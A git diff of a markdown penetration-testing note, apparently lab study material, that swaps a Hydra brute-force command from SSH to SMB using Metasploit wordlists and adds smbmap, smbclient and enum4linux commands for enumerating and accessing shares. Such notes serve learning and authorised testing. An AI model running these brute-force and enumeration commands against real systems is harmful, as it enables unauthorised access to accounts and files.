@@ -59,5 +59,7 @@ After obtaining legitimate credentials, **we can use a utility called SMBMap** i
 #### Exploiting using Hydra
 
 1. Identify SAMBA and version
-2. Run hydra `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP -t 4 ssh`
-3. login `SSH USER@IP`
+2. Run hydra `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP -t 4 smb`
+3. Run `smbmap -H IP -u USER -p PASS`  or `smbclient -L 192.107.192.3 -U USER` to list out the shares
+4. Then once you have identified a share : `smbclient //192.107.192.3/SHARE -U USER `
+(you can also use `enum4linux -a -u USER -p PASS IP` to enumerate shares)
